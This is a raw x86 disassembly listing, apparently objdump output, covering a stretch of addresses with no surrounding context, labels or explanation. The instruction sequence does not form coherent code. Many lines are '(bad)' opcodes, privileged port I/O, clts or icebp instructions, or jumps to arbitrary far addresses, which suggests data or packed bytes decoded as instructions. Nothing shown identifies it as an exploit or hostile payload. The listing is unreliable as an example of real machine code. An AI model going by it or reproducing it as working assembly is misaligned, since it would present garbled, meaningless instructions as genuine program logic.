  4385d2:	mov    ebp,ebp
  4385d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4385d5:	icebp  
  4385d6:	add    esi,DWORD PTR [ebp-0x37]
  4385d9:	pop    ebp
  4385da:	pop    edi
  4385db:	into   
  4385dc:	inc    ecx
  4385dd:	fwait
  4385de:	dec    eax
  4385df:	cmp    DWORD PTR [edi],esi
  4385e1:	mov    bl,0x48
  4385e3:	xor    DWORD PTR [edi],esi
  4385e5:	stos   DWORD PTR es:[edi],eax
  4385e6:	dec    eax
  4385e7:	sub    DWORD PTR [edi],esi
  4385e9:	add    BYTE PTR [ebx],dh
  4385eb:	or     BYTE PTR [esi+0x7af9],ah
  4385f1:	add    BYTE PTR [eax],al
  4385f3:	add    BYTE PTR [edx+eax*2-0x75],al
  4385f7:	ja     0x4385de
  4385f9:	add    al,BYTE PTR [eax]
  4385fb:	jmp    0x5f4343f3
  438600:	aaa    
  438601:	gs ins DWORD PTR es:[edi],dx
  438603:	out    0xc8,eax
  438605:	out    0x36,al
  438607:	jmp    0x6a8349df
  43860c:	ss dec dh
  43860f:	inc    ebx
  438610:	hlt    
  438611:	push   0x19
  438613:	scas   eax,DWORD PTR es:[edi]
  438614:	pop    esp
  438615:	loopne 0x438693
  438617:	add    DWORD PTR [bp+di],eax
  43861a:	add    cl,ch
  43861c:	jbe    0x43860f
  43861e:	xor    ecx,DWORD PTR [edi-0x1643570b]
  438624:	jbe    0x438628
  438626:	add    BYTE PTR [esp+ecx*2-0x20],bh
  43862a:	jl     0x43866b
  43862c:	sub    DWORD PTR [edx],eax
  43862e:	add    cl,ch
  438630:	jbe    0x438623
  438632:	pop    ds
  438633:	xor    DWORD PTR [ecx+0x2],edx
  438636:	add    cl,ch
  438638:	sti    
  438639:	js     0x43864f
  43863b:	call   0x4fd388b6
  438640:	hlt    
  438641:	sub    al,0x0
  438643:	push   esp
  438644:	jae    0x438608
  438646:	jl     0x4385f0
  438648:	bound  ebp,QWORD PTR [eax]
  43864a:	add    al,ch
  43864c:	jbe    0x438650
  43864e:	jl     0x438616
  438650:	test   DWORD PTR [edx-0x43],eax
  438653:	jno    0x4386cc
  438655:	add    al,BYTE PTR [eax]
  438657:	jmp    0x43865c
  43865c:	add    BYTE PTR [ebp-0x4d5233ca],dh
  438662:	ss int3 
  438664:	fidiv  DWORD PTR [esi-0xa677b30]
  43866a:	pop    edi
  43866b:	(bad)  
  43866c:	jmp    DWORD PTR [edi]
  43866e:	daa    
  43866f:	inc    edx
  438670:	rol    DWORD PTR ds:0xee85c002,1
  438676:	ins    DWORD PTR es:[edi],dx
  438677:	jmp    0xbc927b4d
  43867c:	int3   
  43867d:	dec    eax
  43867e:	mov    ebp,0xbd48cccb
  438683:	retf   
  438684:	int3   
  438685:	push   edi
  438686:	jns    0x438644
  438688:	push   ss
  438689:	fadd   QWORD PTR [eax]
  43868b:	dec    ebx
  43868c:	xor    DWORD PTR ds:0xcb376d11,0xffffff96
  438693:	cwde   
  438694:	mov    eax,0x8b0000b2
  438699:	in     al,dx
  43869a:	hlt    
  43869b:	or     BYTE PTR [eax-0x3c],0x78
  43869f:	sbb    al,0x11
  4386a1:	pop    ebx
  4386a2:	inc    ecx
  4386a3:	or     eax,0xb189520f
  4386a8:	push   ss
  4386a9:	pushf  
  4386aa:	add    BYTE PTR [ebx+0x5079c048],al
  4386b0:	or     BYTE PTR [ecx*1-0xb2300f7],ah
  4386b7:	sub    cl,cl
  4386b9:	bnd ja 0x438644
  4386bc:	mov    eax,0x89000082
  4386c1:	add    BYTE PTR [eax],al
  4386c3:	add    BYTE PTR [eax],al
  4386c5:	add    BYTE PTR [edx+esi*4],al
  4386c8:	push   cs
  4386c9:	add    BYTE PTR [ebp+esi*1-0x44],bl
  4386cd:	add    DWORD PTR [ebp+0x67],0x75
  4386d1:	daa    
  4386d2:	out    0x4e,eax
  4386d4:	add    DWORD PTR [ebx-0x677df55c],ecx
  4386da:	les    ecx,FWORD PTR [eax]
  4386dc:	add    BYTE PTR [eax],al
  4386de:	aam    0x12
  4386e0:	add    cl,BYTE PTR [edi]
  4386e2:	mov    ds:0x4c16b18e,al
  4386e7:	add    bh,dh
  4386e9:	inc    eax
  4386ea:	jne    0x438751
  4386ec:	add    BYTE PTR [eax-0x29417],0x1d
  4386f3:	hlt    
  4386f4:	jp     0x438686
  4386f6:	fisttp QWORD PTR [ebx-0x3]
  4386f9:	jmp    FWORD PTR [esi+0x39cc4098]
  4386ff:	xchg   BYTE PTR [eax-0x34],al
  438702:	xor    DWORD PTR [esi],ebp
  438704:	inc    eax
  438705:	int3   
  438706:	sub    DWORD PTR [esi],edx
  438708:	inc    eax
  438709:	int3   
  43870a:	shl    eax,0x7b
  43870d:	mov    esp,0x4cfd5983
  438712:	test   dl,0xfb
  438715:	jns    0x4386ae
  438717:	push   esp
  438718:	mov    bh,0x98
  43871a:	or     eax,0xfefffd44
  43871f:	mov    DWORD PTR [ecx],edx
  438721:	test   DWORD PTR ds:0x641c7571,ebp
  438727:	add    al,0xc4
  438729:	adc    eax,DWORD PTR [eax]
  43872b:	add    BYTE PTR [eax],al
  43872d:	add    BYTE PTR [eax],al
  43872f:	(bad)  
  438730:	mov    eax,ds:0x61458511
  438735:	(bad)  
  438736:	mov    cl,0xfd
  438738:	ret    0x15
  43873b:	jne    0x43874d
  43873d:	adc    al,0x83
  43873f:	mov    esp,0x3d8512eb
  438744:	popa   
  438745:	jp     0x438797
  438747:	imul   ebp,edi,0x5963b884
  43874d:	std    
  43874e:	xchg   DWORD PTR [ecx-0x7ebf9196],edx
  438754:	or     BYTE PTR [ebx],bh
  438756:	(bad)  
  438757:	in     al,dx
  438758:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43875a:	adc    dh,BYTE PTR [ebp+0x59]
  43875d:	jl     0x4386e7
  43875f:	adc    DWORD PTR [ebx-0x3],eax
  438762:	jmp    FWORD PTR [esi+0x31cc3998]
  438768:	add    dh,BYTE PTR [ebx-0x54c9d6c1]
  43876e:	aas    
  43876f:	inc    ecx
  438770:	ss cmp al,0x7f
  438773:	sbb    edi,ecx
  438775:	xor    BYTE PTR [edi+0x4a],bh
  438778:	ja     0x4387ef
  43877a:	pop    ebx
  43877b:	jmp    0x4387df
  43877d:	jp     0x4387f1
  43877f:	nop
  438780:	in     eax,0xde
  438782:	add    eax,DWORD PTR [ecx+0x66bb5dc0]
  438788:	ja     0x438741
  43878a:	sti    
  43878b:	repnz add eax,0xe3572f8
  438791:	pop    esi
  438792:	rol    DWORD PTR [eax],cl
  438794:	add    BYTE PTR [eax],al
  438796:	add    BYTE PTR [eax],al
  438798:	jb     0x438765
  43879a:	pop    ebp
  43879b:	jmp    0x438723
  43879d:	ja     0x4387cd
  43879f:	inc    esp
  4387a0:	sar    cl,cl
  4387a2:	outs   dx,BYTE PTR ds:[esi]
  4387a3:	jmp    DWORD PTR [ebp+0x63]
  4387a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4387a7:	pop    ss
  4387a8:	lock jmp 0xfa690680
  4387ae:	ins    BYTE PTR es:[edi],dx
  4387af:	ds (bad) 
  4387b1:	push   eax
  4387b2:	outs   dx,DWORD PTR ds:[esi]
  4387b3:	inc    DWORD PTR [ebp-0xfe8589d]
  4387b9:	jmp    0xfa8906b0
  4387be:	ins    DWORD PTR es:[edi],dx
  4387bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4387c1:	push   eax
  4387c2:	sub    BYTE PTR [ebp+edi*2+0x7a],bl
  4387c6:	jecxz  0x4387e2
  4387c8:	mov    ecx,es
  4387ca:	rcl    dl,cl
  4387cc:	test   DWORD PTR [esi+0x5b],0xe786ee24
  4387d3:	add    esi,DWORD PTR [ebp+0x2]
  4387d6:	pop    esi
  4387d7:	mov    esp,0xfc378d86
  4387dc:	mov    ecx,0xf0fc248b
  4387e1:	add    BYTE PTR [edi+0x10],ch
  4387e4:	or     BYTE PTR [ebp+0x5b491400],0x40
  4387eb:	aad    0x2c
  4387ed:	test   ebp,edx
  4387ef:	sbb    al,0xcf
  4387f1:	mov    esp,0x4eb83c54
  4387f6:	int3   
  4387f7:	cmp    al,0xa8
  4387f9:	outs   dx,BYTE PTR ds:[esi]
  4387fa:	jge    0x438879
  4387fc:	add    BYTE PTR [eax],al
  4387fe:	add    BYTE PTR [eax],al
  438800:	add    BYTE PTR [ecx-0x4c],bl
  438803:	mov    bh,ah
  438805:	nop
  438806:	das    
  438807:	mov    DWORD PTR [ecx+0x76],0x69e90002
  43880e:	xor    al,0x8b
  438810:	mov    ch,0x38
  438812:	in     al,0x84
  438814:	fld    QWORD PTR [ebx+0x62]
  438817:	(bad)  
  438818:	jmp    0x9374:0x5efce467
  43881f:	retf   0x5fc7
  438822:	into   
  438823:	inc    edx
  438824:	dec    ecx
  438825:	mov    cl,0xde
  438827:	imul   esi
  438829:	les    esp,FWORD PTR [ebp+0x2d]
  43882c:	aas    
  43882d:	repnz aaa 
  43882f:	js     0x438836
  438831:	je     0x4387c6
  438833:	push   esp
  438834:	pop    esi
  438835:	jae    0x4387bc
  438837:	into   
  438838:	xchg   ebp,eax
  438839:	mov    WORD PTR [ebx],cs
  43883b:	mov    cl,0xad
  43883d:	ret    
  43883e:	inc    ecx
  43883f:	test   DWORD PTR [ecx],esp
  438841:	mov    ecx,0xc3ad86e3
  438846:	inc    ecx
  438847:	call   0xf99e8d05
  43884c:	(bad)  
  43884d:	clts   
  43884f:	mov    cl,0xa7
  438851:	push   ecx
  438852:	outs   dx,DWORD PTR ds:[esi]
  438853:	jp     0x43881a
  438855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438856:	xchg   bl,ah
  438858:	cmp    al,0xb8
  43885a:	dec    esi
  43885b:	int3   
  43885c:	cmp    al,0xe8
  43885e:	outs   dx,BYTE PTR ds:[esi]
  43885f:	jge    0x43881e
  438861:	pop    esi
  438862:	xchg   BYTE PTR [ebx+0x0],al
  438865:	add    BYTE PTR [eax],al
  438867:	add    BYTE PTR [eax],al
  438869:	add    BYTE PTR [esi+esi*1+0x50],ah
  43886d:	mov    esi,DWORD PTR [edi+ebx*8+0x3f]
  438871:	or     bh,dl
  438873:	xor    eax,0x86248b05
  438878:	sar    edi,0x1f
  43887b:	lds    eax,FWORD PTR [eax+0x44dbd455]
  438881:	cld    
  438882:	fisttp DWORD PTR [edx+0x50c1450]
  438888:	add    BYTE PTR [eax],al
  43888a:	or     al,0x5
  43888c:	mov    edi,0xfffa6886
  438891:	inc    ecx
  438893:	push   es
  438894:	add    BYTE PTR [eax],al
  438896:	cdq    
  438897:	mov    bh,0x75
  438899:	sub    al,BYTE PTR ss:[esi+0x58dc873c]
  4388a0:	sbb    edi,edi
  4388a2:	pop    edx
  4388a3:	xor    eax,0xddcc000d
  4388a8:	lea    edx,[eax-0x48]
  4388ab:	add    al,0x0
  4388ad:	mov    DWORD PTR [eax+0x7b],ebx
  4388b0:	pop    esp
  4388b1:	or     ebx,esp
  4388b3:	add    al,0x81
  4388b5:	inc    ebp
  4388b6:	nop
  4388b7:	retf   
  4388b8:	xor    DWORD PTR [eax],0xffffffb4
  4388bb:	clc    
  4388bc:	(bad)  
  4388bd:	call   FWORD PTR [ebp+ebx*8+0x159bebc7]
  4388c4:	retf   0x1566
  4388c7:	cmp    DWORD PTR [eax+0x3d2dcc02],eax
  4388cd:	clc    
  4388ce:	add    BYTE PTR [eax],al
  4388d0:	add    BYTE PTR [eax],al
  4388d2:	add    BYTE PTR [eax],dl
  4388d4:	pop    ds
  4388d5:	jnp    0x438895
  4388d7:	in     al,dx
  4388d8:	clc    
  4388d9:	(bad)  
  4388da:	dec    DWORD PTR [esi-0x6a7cb591]
  4388e0:	add    esi,DWORD PTR [ebp+0x5]
  4388e3:	popf   
  4388e4:	fstp   TBYTE PTR [eax+0x2e6b75eb]
  4388ea:	shl    BYTE PTR [edx-0x18],0xd3
  4388ee:	adc    esi,DWORD PTR [ebp+0x69]
  4388f1:	jbe    0x438885
  4388f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4388f4:	xor    eax,0xedfcfffd
  4388f9:	xchg   ecx,eax
  4388fa:	pop    esp
  4388fb:	outs   dx,BYTE PTR ds:[esi]
  4388fc:	imul   edi,ebp,0xfd6974b5
  438902:	call   FWORD PTR [ebx+0x338117d2]
  438908:	out    dx,al
  438909:	add    DWORD PTR [eax-0x77],ebx
  43890c:	imul   edi,ebp,0x9bd81aff
  438912:	adc    dh,BYTE PTR [ebp+0x69]
  438915:	mov    ch,dl
  438917:	and    DWORD PTR [edx+edi*8-0x50],0x26fdecb9
  43891f:	repz jne 0x438934
  438922:	add    BYTE PTR [ebp-0x14],dh
  438925:	test   eax,0xfd698150
  43892a:	std    
  43892b:	pop    esi
  43892c:	jnp    0x4389a9
  43892e:	dec    ebx
  43892f:	(bad)  
  438931:	(bad)  
  438932:	pop    es
  438933:	cld    
  438934:	xchg   ebx,eax
  438935:	add    DWORD PTR [ebp+0x0],eax
  43893b:	add    bl,dh
  43893d:	jns    0x438950
  43893f:	add    BYTE PTR [ebp-0x4e],dh
  438942:	adc    al,0xbe
  438944:	out    dx,al
  438945:	rcl    DWORD PTR [edx-0xb],0xf6
  438949:	and    al,0x3
  43894b:	jl     0x4388d1
  43894d:	pushf  
  43894e:	jbe    0x438912
  438950:	lea    edx,[ecx-0x6b6506a0]
  438956:	jle    0x43891c
  438958:	jns    0x438946
  43895a:	dec    DWORD PTR fs:[ecx]
  43895d:	or     BYTE PTR [ebp+0x43],dh
  438960:	jge    0x438944
  438962:	(bad)  
  438963:	test   DWORD PTR [esi+0x1980ea02],0x7503e726
  43896d:	add    bl,BYTE PTR [esi-0x7b]
  438970:	(bad)
  438973:	add    esi,eax
  438975:	lea    ebp,[ecx-0x31]
  438978:	jns    0x43897c
  43897a:	out    0x7a,eax
  43897c:	out    dx,eax
  43897d:	loope  0x43895c
  43897f:	add    esi,DWORD PTR [ebp-0x36]
  438982:	pop    edi
  438983:	test   DWORD PTR [ebp-0x64fc190a],esp
  438989:	add    DWORD PTR [esi+0x45],ebp
  43898c:	repnz pop DWORD PTR [edi]
  43898f:	sti    
  438990:	and    bl,BYTE PTR [edi+0x7f]
  438993:	push   ss
  438994:	push   cs
  438995:	pop    edi
  438996:	cmp    BYTE PTR [edx-0x9],0xe1
  43899a:	in     eax,dx
  43899b:	add    esi,DWORD PTR [ebp-0x7d]
  43899e:	popf   
  43899f:	outs   dx,BYTE PTR ds:[esi]
  4389a0:	add    BYTE PTR [eax],al
  4389a2:	add    BYTE PTR [eax],al
  4389a4:	add    BYTE PTR [edx],al
  4389a6:	jne    0x4389bb
  4389a8:	sbb    BYTE PTR [ebp+0x2],dh
  4389ab:	outs   dx,BYTE PTR ds:[esi]
  4389ac:	jge    0x4389f7
  4389ae:	mul    dh
  4389b0:	add    esi,edx
  4389b2:	jge    0x438a15
  4389b4:	iret   
  4389b5:	jns    0x4389b9
  4389b7:	out    0x4,eax
  4389b9:	pop    es
  4389ba:	mov    dh,0xda
  4389bc:	add    esi,DWORD PTR [ebp-0x75]
  4389bf:	imul   edx,edi,0x7ce70266
  4389c5:	stc    
  4389c6:	(bad)  
  4389c7:	mov    edi,edx
  4389c9:	mov    edx,0x897a895e
  4389ce:	xchg   DWORD PTR [ecx+0x5e7f8102],eax
  4389d4:	shr    BYTE PTR [edx-0x13e8a019],0x8b
  4389db:	pop    ebx
  4389dc:	or     eax,0x3e6f62d
  4389e1:	repz lea eax,[eax]
  4389e4:	out    dx,eax
  4389e5:	scas   al,BYTE PTR es:[edi]
  4389e6:	repnz (bad) 
  4389e8:	call   0x2347cfe4
  4389ed:	(bad)  
  4389ee:	or     esi,DWORD PTR [edx+0xa5f64bb]
  4389f4:	lahf   
  4389f5:	mov    BYTE PTR [edi-0x63342eb5],0x88
  4389fc:	pop    ebp
  4389fd:	push   ebx
  4389fe:	mov    dh,0x13
  438a00:	jmp    0x98f4957b
  438a05:	pop    ebx
  438a06:	test   DWORD PTR [esi+eiz*2+0x0],edx
  438a0a:	add    BYTE PTR [eax],al
  438a0c:	add    BYTE PTR [eax],al
  438a0e:	ja     0x4389f0
  438a10:	xchg   BYTE PTR ds:0x6f885d00,bh
  438a16:	adc    DWORD PTR [edi],eax
  438a18:	add    cl,ch
  438a1a:	aaa    
  438a1b:	call   0x85f6ec1e
  438a20:	dec    ebx
  438a21:	xor    DWORD PTR [ecx-0x67811374],0xf5edc3df
  438a2b:	cwde   
  438a2c:	push   eax
  438a2d:	aad    0x76
  438a2f:	add    bh,dh
  438a31:	cmc    
  438a32:	jae    0x438a50
  438a34:	stc    
  438a35:	pop    esi
  438a36:	pop    eax
  438a37:	pop    ebx
  438a38:	mov    bh,BYTE PTR [ebp+0x6200028a]
  438a3e:	repz mov dh,0x13
  438a41:	jmp    0xc9d611bc
  438a46:	int    0x5d
  438a48:	stc    
  438a49:	bound  eax,QWORD PTR [edx]
  438a4b:	push   es
  438a4c:	xchg   DWORD PTR [ebp-0xd],edx
  438a4f:	mov    esi,0x8776e904
  438a54:	ret    0x5811
  438a57:	imul   edi,ecx,0xfbb91c16
  438a5d:	pop    esp
  438a5e:	add    ebx,DWORD PTR [edi]
  438a60:	add    eax,0xe8019c00
  438a65:	mov    cl,0x89
  438a67:	out    dx,al
  438a68:	neg    BYTE PTR [edi-0x19]
  438a6b:	fcmovu st,st(4)
  438a6d:	pop    ebp
  438a6e:	dec    edi
  438a6f:	ret    0xcccb
  438a72:	add    BYTE PTR [eax],al
  438a74:	add    BYTE PTR [eax],al
  438a76:	add    BYTE PTR [eax],ch
  438a78:	sbb    eax,0x1d18cccc
  438a7d:	int3   
  438a7e:	int3   
  438a7f:	mov    ds:0xd28befdb,al
  438a84:	or     eax,0xdc5c0003
  438a89:	test   DWORD PTR [esp+ebx*2+0x34560001],edx
  438a90:	pop    edx
  438a91:	call   0x7e1d9695
  438a96:	sub    BYTE PTR [edi],ah
  438a98:	add    DWORD PTR [eax],eax
  438a9a:	lea    ebx,[edx+0xc0000d9]
  438aa0:	aaa    
  438aa1:	loope  0x438a9c
  438aa3:	call   0x311:0xa28df6ee
  438aaa:	add    BYTE PTR [ecx+esi*1],bl
  438aad:	loope  0x438a7c
  438aaf:	mov    esi,ebp
  438ab1:	test   BYTE PTR [ebx+0x12b15cd0],0xdc
  438ab8:	add    BYTE PTR [eax],al
  438aba:	jmp    0x438a9b
  438abc:	fild   DWORD PTR [eax+0x0]
  438abf:	fist   DWORD PTR [esi+0x410f0c88]
  438ac5:	stc    
  438ac6:	gs pop edi
  438ac8:	lods   eax,DWORD PTR ds:[esi]
  438ac9:	xchg   BYTE PTR [esi-0x3a],bh
  438acc:	add    BYTE PTR [eax],al
  438ace:	add    BYTE PTR [ecx],al
  438ad0:	cmp    BYTE PTR [eax],cl
  438ad2:	mov    dh,0x1c
  438ad4:	pop    edx
  438ad5:	cmp    al,0x40
  438ad7:	pushf  
  438ad8:	data16 jl 0x438a97
  438adb:	add    BYTE PTR [eax],al
  438add:	add    BYTE PTR [eax],al
  438adf:	add    BYTE PTR [edx],ah
  438ae1:	outs   dx,DWORD PTR ds:[esi]
  438ae2:	add    eax,DWORD PTR [eax]
  438ae4:	jne    0x438b51
  438ae6:	std    
  438ae7:	jb     0x438b46
  438ae9:	cmp    al,0xb3
  438aeb:	mov    BYTE PTR [edi-0x58],bh
  438aee:	mov    ebp,0xa8e810ff
  438af3:	mov    al,BYTE PTR [ebx]
  438af5:	popa   
  438af6:	std    
  438af7:	push   DWORD PTR [ebp-0x2a]
  438afa:	das    
  438afb:	or     DWORD PTR [ebx],ebp
  438afd:	(bad)  
  438aff:	cmp    al,0xb5
  438b01:	imul   ebx,edi,0xe5dc217c
  438b07:	add    eax,0x72fd6975
  438b0c:	test   eax,ebp
  438b0e:	pop    ebx
  438b0f:	add    al,0xf6
  438b11:	inc    ecx
  438b12:	add    DWORD PTR [ebx+0x5],edi
  438b15:	out    0xb7,eax
  438b17:	aas    
  438b18:	fs push 0x77
  438b1b:	test   al,0x8b
  438b1d:	imul   edi,ebp,0x77123659
  438b23:	dec    esp
  438b24:	mov    ch,0x5a
  438b26:	add    al,0x8a
  438b28:	int    0x53
  438b2a:	std    
  438b2b:	push   DWORD PTR [ebx+0x77e881a8]
  438b31:	out    dx,al
  438b32:	mov    bh,0x3f
  438b34:	fs push 0x77
  438b37:	test   al,0x63
  438b39:	imul   edi,ebp,0x5be8b659
  438b3f:	std    
  438b40:	stc    
  438b41:	lods   eax,DWORD PTR ds:[esi]
  438b42:	mov    ebp,0xe
  438b47:	add    BYTE PTR [eax],al
  438b49:	je     0x438b2e
  438b4b:	fwait
  438b4c:	adc    dh,BYTE PTR [ebp+0x69]
  438b4f:	(bad)  
  438b50:	mov    esp,0xcc3815c1
  438b55:	mov    ecx,0xb1cc382d
  438b5a:	jle    0x438bd6
  438b5c:	in     al,dx
  438b5d:	out    dx,al
  438b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438b5f:	cmc    
  438b60:	test   ch,bh
  438b62:	add    ah,BYTE PTR [ebx+0x12]
  438b65:	jne    0x438b69
  438b67:	ins    WORD PTR es:[edi],dx
  438b69:	outs   dx,BYTE PTR ds:[esi]
  438b6a:	fdivr  QWORD PTR [edi-0x2a]
  438b6d:	inc    esp
  438b6e:	xchg   DWORD PTR [edi+ecx*1-0x1de678e9],edx
  438b75:	mov    ecx,0x7abc6e60
  438b7a:	in     al,0xdf
  438b7c:	xchg   ebx,eax
  438b7d:	mov    ebp,0x7c03e6f4
  438b82:	xchg   esp,eax
  438b83:	jg     0x438b30
  438b85:	xchg   DWORD PTR [edx],eax
  438b87:	out    0x7e,eax
  438b89:	vdivss xmm0,xmm1,DWORD PTR [edi]
  438b8d:	push   0xb
  438b8f:	xchg   ecx,eax
  438b90:	mov    ecx,DWORD PTR [edx]
  438b92:	hlt    
  438b93:	out    0x3,al
  438b95:	dec    esp
  438b96:	ret    0x7ed2
  438b99:	lods   eax,DWORD PTR ds:[esi]
  438b9a:	neg    BYTE PTR [ebp-0x2d]
  438b9d:	jb     0x438b29
  438b9f:	retf   
  438ba0:	adc    al,0xf8
  438ba2:	jno    0x438c07
  438ba4:	adc    DWORD PTR [ebp+0x2],esi
  438ba7:	call   0x1d:0xf79186c3
  438bae:	add    BYTE PTR [eax],al
  438bb0:	add    BYTE PTR [eax],al
  438bb2:	xor    esp,esp
  438bb4:	mov    ch,0x59
  438bb6:	clc    
  438bb7:	int3   
  438bb8:	(bad)  
  438bb9:	xchg   bl,cl
  438bbb:	dec    esi
  438bbc:	jo     0x438b51
  438bbe:	shl    ebx,0xe6
  438bc1:	add    esi,eax
  438bc3:	mov    ah,0xda
  438bc5:	loope  0x438bc2
  438bc7:	xchg   ecx,eax
  438bc8:	lahf   
  438bc9:	adc    DWORD PTR [ebp+0x2],esi
  438bcc:	mov    ecx,0x3f0158ce
  438bd1:	dec    esi
  438bd2:	loopne 0x438c2e
  438bd4:	dec    edx
  438bd5:	xchg   BYTE PTR [ecx+0x5746a405],bh
  438bdb:	xchg   DWORD PTR [edi+ecx*1+0x4b002f57],edx
  438be2:	repz call 0xe912:0x9e2e5ffd
  438bea:	jbe    0x438b71
  438bec:	dec    ebx
  438bed:	stc    
  438bee:	xchg   esp,eax
  438bef:	add    edx,DWORD PTR [eax+0x28451]
  438bf5:	bound  esp,QWORD PTR [ebp+0x2ee86606]
  438bfb:	lods   al,BYTE PTR ds:[esi]
  438bfc:	cmc    
  438bfd:	dec    BYTE PTR [ebx*8-0x6252123d]
  438c04:	int3   
  438c05:	sbb    eax,0xb5cc46aa
  438c0a:	lods   eax,DWORD PTR ds:[esi]
  438c0b:	inc    esi
  438c0c:	int3   
  438c0d:	lods   eax,DWORD PTR ds:[esi]
  438c0e:	popf   
  438c0f:	inc    esi
  438c10:	int3   
  438c11:	cmp    al,0xd8
  438c13:	test   WORD PTR [eax+eax*1],sp
  438c17:	add    BYTE PTR [eax],al
  438c19:	add    BYTE PTR [eax],al
  438c1b:	push   ecx
  438c1c:	mov    ebp,0x5bdb7de6
  438c21:	stc    
  438c22:	lods   eax,DWORD PTR ds:[esi]
  438c23:	jge    0x438c6b
  438c25:	int3   
  438c26:	sbb    al,0xb8
  438c28:	dec    di
  438c2a:	sbb    dh,BYTE PTR [eax-0x57c0f043]
  438c30:	aad    0x7
  438c32:	push   0xffffffcf
  438c34:	jle    0x438c36
  438c36:	jmp    0xa6948eb1
  438c3b:	rcr    BYTE PTR [ebp+0x0],cl
  438c3e:	jmp    0x1abd8eb9
  438c43:	sbb    BYTE PTR [edi*2+0x745862f6],0xe1
  438c4b:	dec    esi
  438c4c:	push   esp
  438c4d:	mul    DWORD PTR [esi+0x5c]
  438c50:	add    DWORD PTR [ecx+0xd],0xe218846a
  438c57:	jbe    0x438c5b
  438c59:	push   eax
  438c5a:	inc    ecx
  438c5b:	test   BYTE PTR [esi-0x7],dl
  438c5e:	add    BYTE PTR [ebx],dh
  438c60:	rol    DWORD PTR [ebp+0x5c724],1
  438c66:	push   ecx
  438c67:	xor    al,0xf7
  438c69:	sti    
  438c6a:	jmp    DWORD PTR [ebx+0x7f]
  438c6d:	les    ecx,FWORD PTR [eax]
  438c6f:	daa    
  438c70:	(bad)  
  438c71:	out    0x21,eax
  438c73:	sub    bl,0xf6
  438c76:	mov    ebx,DWORD PTR [edx]
  438c78:	jbe    0x438c88
  438c7a:	add    BYTE PTR [esi+edx*8+0xac85],bl
  438c81:	add    BYTE PTR [eax],al
  438c83:	add    BYTE PTR [edx+0x4e830005],ch
  438c89:	pop    eax
  438c8a:	jl     0x438c4d
  438c8c:	xchg   esi,eax
  438c8d:	(bad)
  438c91:	mov    ebp,0xea9988fa
  438c96:	xor    cl,dl
  438c98:	retf   
  438c99:	add    esp,ebx
  438c9b:	add    edx,ecx
  438c9d:	xchg   esi,eax
  438c9e:	dec    BYTE PTR [edx+0x43ad00d]
  438ca4:	ja     0x438c66
  438ca6:	outs   dx,BYTE PTR ds:[esi]
  438ca7:	sbb    eax,edi
  438ca9:	cwde   
  438caa:	add    eax,0xd690c85
  438caf:	mov    esp,DWORD PTR [ecx-0xe]
  438cb2:	dec    esi
  438cb3:	push   ebx
  438cb4:	ins    BYTE PTR es:[edi],dx
  438cb5:	xor    al,0xe1
  438cb7:	mov    cl,0x2
  438cb9:	jmp    0x4ce0:0xf4c883f6
  438cc0:	sbb    eax,0xb2830005
  438cc5:	(bad)  
  438cc7:	dec    DWORD PTR [ecx+ebx*2]
  438cca:	or     BYTE PTR [ecx+edi*1+0x27000005],al
  438cd1:	pop    ss
  438cd2:	pop    es
  438cd3:	test   BYTE PTR [ecx],al
  438cd5:	add    eax,0xdb670000
  438cda:	mov    ebx,0xfd6b7516
  438cdf:	test   BYTE PTR [eax+0x4f],dl
  438ce2:	jb     0x438d35
  438ce4:	jno    0x438cd2
  438ce6:	or     eax,DWORD PTR gs:[eax]
  438ce9:	add    BYTE PTR [eax],al
  438ceb:	add    BYTE PTR [eax],al
  438ced:	inc    ebx
  438cee:	jge    0x438ccf
  438cf0:	test   BYTE PTR [edi-0x11fabb8],dh
  438cf6:	js     0x438d01
  438cf8:	bound  edi,QWORD PTR [ecx+ebp*8-0x5c]
  438cfc:	adc    dh,BYTE PTR [ebp+0x6b]
  438cff:	clc    
  438d00:	mov    cl,0xfb
  438d02:	mov    dl,0xe
  438d04:	add    BYTE PTR [ebp-0x1c],dh
  438d07:	mov    esi,0xfe5efd07
  438d0c:	clc    
  438d0d:	cmp    ebp,DWORD PTR [edi]
  438d0f:	clc    
  438d10:	mov    cl,0xdb
  438d12:	adc    DWORD PTR [edi],ecx
  438d14:	add    BYTE PTR [ebp-0x1c],dh
  438d17:	mov    esi,0xfc0ffe13
  438d1c:	xchg   DWORD PTR [ecx+0x19827651],eax
  438d22:	pop    eax
  438d23:	std    
  438d24:	call   DWORD PTR [edx+0x20]
  438d27:	adc    BYTE PTR [edi+0x623bf365],ch
  438d2d:	es xor al,0x7d
  438d30:	rol    BYTE PTR [esi-0x1d],0x79
  438d34:	mov    esp,0x61fd698b
  438d39:	cld    
  438d3a:	xlat   BYTE PTR ds:[ebx]
  438d3b:	stos   DWORD PTR es:[edi],eax
  438d3c:	adc    dh,BYTE PTR [ebp+0x69]
  438d3f:	push   esi
  438d40:	or     eax,0x625e9c93
  438d45:	jl     0x438d16
  438d47:	stos   DWORD PTR es:[edi],eax
  438d48:	adc    dh,BYTE PTR [ebp+0x69]
  438d4b:	jle    0x438d0c
  438d4d:	jbe    0x438d21
  438d4f:	jno    0x438d0d
  438d51:	add    BYTE PTR [eax],al
  438d53:	add    BYTE PTR [eax],al
  438d55:	add    BYTE PTR [ebx+0x69],ah
  438d58:	std    
  438d59:	test   BYTE PTR [eax],bh
  438d5b:	in     eax,0x74
  438d5d:	mov    bl,BYTE PTR [ebp+0x7503ee02]
  438d63:	mov    esi,DWORD PTR [ecx+0x8]
  438d66:	jo     0x438d6a
  438d68:	out    0xc3,eax
  438d6a:	inc    edx
  438d6b:	shl    DWORD PTR [edi+0x7b6a38c1],0x72
  438d72:	mov    esp,0xed7e6c57
  438d77:	or     edi,esp
  438d79:	add    eax,DWORD PTR [ebp-0x7b]
  438d7c:	pop    ecx
  438d7d:	nop
  438d7e:	jne    0x438d82
  438d80:	out    0xd4,eax
  438d82:	stc    
  438d83:	inc    eax
  438d84:	xorps  xmm4,XMMWORD PTR [ecx-0x467ceda9]
  438d8b:	out    dx,al
  438d8c:	(bad)  
  438d8d:	jns    0x438e04
  438d8f:	add    ah,bh
  438d91:	jp     0x438d82
  438d93:	xchg   esi,eax
